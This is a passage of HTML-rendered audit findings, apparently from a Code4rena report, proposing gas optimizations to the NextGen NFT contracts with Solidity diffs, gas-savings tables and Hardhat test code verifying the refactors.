href=\"#recommendation-20\" aria-label=\"recommendation 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>This variable is redundant because the <code>gencoreContract</code> variable is already used to store the address of the Gencore contract. The <code>gencore</code> variable is only used in the <code>calculateTokenHash</code> function, which could be easily updated to use the <code>gencoreContract</code> variable instead.</p>\n<p><strong>STEP 1:</strong> Remove deceleration:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">contract NextGenRandomizerNXT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IXRandoms public randoms;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    INextGenAdmins private adminsContract;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    INextGenCore public gencoreContract;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // @audit redundant storage variable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    address gencore;  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong>STEP 2:</strong> Remove assignment from constructor:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    constructor(address _randoms, address _admin, address _gencore) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        randoms = IXRandoms(_randoms);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        adminsContract = INextGenAdmins(_admin);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       gencore = _gencore;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        gencoreContract = INextGenCore(_gencore);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong>STEP 3:</strong>  Remove assignment from <code>updateCoreContract</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function updateCoreContract(address _gencore) public FunctionAdminRequired(this.updateCoreContract.selector) { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       gencore = _gencore;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        gencoreContract = INextGenCore(_gencore);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong>STEP 4:</strong> Update <code>calculateTokenHash</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // function that calculates the random hash and returns it to the gencore contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function calculateTokenHash(uint256 _collectionID, uint256 _mintIndex, uint256 _saltfun_o) public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       require(msg.sender == gencore);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       require(msg.sender == address(gencoreContract))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 hash = keccak256(abi.encodePacked(_mintIndex, blockhash(block.number - 1), randoms.randomNumber(), randoms.randomWord()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        gencoreContract.setTokenHash(_collectionID, _mintIndex, hash);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"poc-7\" style=\"position:relative;\"><a href=\"#poc-7\" aria-label=\"poc 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<p>This can be verified using existing test suite.</p>\n<h2 id=\"g-04-remove-duplicate-reference-to-randomizer-contract\" style=\"position:relative;\"><a href=\"#g-04-remove-duplicate-reference-to-randomizer-contract\" aria-label=\"g 04 remove duplicate reference to randomizer contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Remove duplicate reference to randomizer contract</h2>\n<p><strong>22,761 gas can be saved.</strong></p>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Before</th>\n<th>After</th>\n<th>Gas Saved</th>\n<th>Test Passes?</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>NextGenCore:addRandomizer()</code></td>\n<td>70696</td>\n<td>53535</td>\n<td>17161</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenMinterContract::mint()</code></td>\n<td>404474</td>\n<td>402474</td>\n<td>2000</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenMinterContract::airDropTokens()</code></td>\n<td>744940</td>\n<td>742940</td>\n<td>2000</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenMinterContract::burnToMint()</code></td>\n<td>276474</td>\n<td>274874</td>\n<td>1600</td>\n<td>Yes</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"recommendation-21\" style=\"position:relative;\"><a href=\"#recommendation-21\" aria-label=\"recommendation 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>It is sufficient to only store the address of the randomizer in <code>collectionAdditonalDataStructure</code>.  The randomizer contract instance can be referenced by providing this address to <code>IRandomizer</code> interface. The gas savings also cascade to critical operations such as <code>mint</code> , <code>burnToMint</code>, and <code>airDropTokens</code>. </p>\n<p><strong>STEP 1:</strong> Remove duplicate declaration from struct:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    struct collectionAdditonalDataStructure {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address collectionArtistAddress;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 maxCollectionPurchases;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 collectionCirculationSupply;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 collectionTotalSupply;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 reservedMinTokensIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 reservedMaxTokensIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint setFinalSupplyTimeAfterMint;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address randomizerContract;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       IRandomizer randomizer;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L44-L54\">Source: smart-contracts/NextGenCore.sol#L44-L54</a></p>\n<p><strong>Step 2:</strong> Remove the duplicate assignment:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">function addRandomizer(...) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t__SNIP__        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\tcollectionAdditionalData[_collectionID].randomizerContract = _randomizerContract;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   collectionAdditionalData[_collectionID].randomizer = IRandomizer(_randomizerContract);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L170-L174\">Source: smart-contracts/NextGenCore.sol#L170-L174</a></p>\n<p><strong>Step 3:</strong> Get randomizer instance using <code>IRandomizer</code> interface:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function _mintProcessing(...) internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      __SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    IRandomizer(collectionAdditionalData[_collectionID].randomizerContract).calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t __SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L229\">Source: smart-contracts/NextGenCore.sol#L229</a></p>\n<p>Optionally, for ease of understanding struct property could be renamed from <code>randomizerContract</code> to <code>randomizerContractAddress</code>.</p>\n<h3 id=\"poc-8\" style=\"position:relative;\"><a href=\"#poc-8\" aria-label=\"poc 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<p><img src=\"https://i.imgur.com/g7uU9GK.png\" alt=\"Test result\"></p>\n<h3 id=\"poc-test-file-2\" style=\"position:relative;\"><a href=\"#poc-test-file-2\" aria-label=\"poc test file 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC test file</h3>\n<p>POC can be verified using the existing test suite by adding the following test to cover <code>burnToMint</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">context</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Verify `burnToMint`&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD burn existing token and mint a new one&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenOfOwnerByIndex</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initializeBurn</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">burnToMint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000000000</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPrice</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reverted</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk7\">30000000002</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span></code></pre>\n<h2 id=\"g-05-remove-redundant-external-call-during-airdrop\" style=\"position:relative;\"><a href=\"#g-05-remove-redundant-external-call-during-airdrop\" aria-label=\"g 05 remove redundant external call during airdrop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Remove redundant external call during airdrop</h2>\n<p><strong>3066 gas can saved.</strong></p>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Before</th>\n<th>After</th>\n<th>Gas Saved</th>\n<th>Test Passes?</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>NextGenMinterContract:airDropTokens()</code></td>\n<td>1126101</td>\n<td>1123035</td>\n<td>3066</td>\n<td>Yes</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"recommendation-22\" style=\"position:relative;\"><a href=\"#recommendation-22\" aria-label=\"recommendation 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function airDropTokens(...) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       require(gencore.retrievewereDataAdded(_collectionID) == true, &quot;Add data&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 collectionTokenMintIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint256 y=0; y&lt; _recipients.length; y++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            collectionTokenMintIndex = gencore.viewTokensIndexMin(_collectionID) + gencore.viewCirSupply(_collectionID) + _numberOfTokens[y] - 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            require(collectionTokenMintIndex &lt;= gencore.viewTokensIndexMax(_collectionID), &quot;No supply&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L182\">Source: smart-contracts/MinterContract.sol#L182</a> </p>\n<p>The removed line of code checks to see if the collection data has been added. If it has not, the function reverts with the error message â€œAdd dataâ€. As discussed in [G-4], <code>retrievewereDataAdded</code> returns true only once total supply is added. The function later checks to see if the total tokens to be airdropped is within total supply. If they are not, the function will revert with the error message â€œNo supplyâ€. Therefore, the first check for whether the collection data has been added is not necessary.</p>\n<h3 id=\"poc-9\" style=\"position:relative;\"><a href=\"#poc-9\" aria-label=\"poc 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<p><img src=\"https://i.imgur.com/xNlDPtN.png\" alt=\"Test Result\"></p>\n<h3 id=\"poc-test-file-3\" style=\"position:relative;\"><a href=\"#poc-test-file-3\" aria-label=\"poc test file 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC test file</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">loadFixture</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;@nomicfoundation/hardhat-toolbox/network-helpers&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">expect</span><span class=\"mtk1\"> } = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;chai&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\"> } = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;hardhat&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fixturesDeployment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;../scripts/fixturesDeployment.js&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;verify removal of redundant external call from airdropTokens&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">before</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ({ 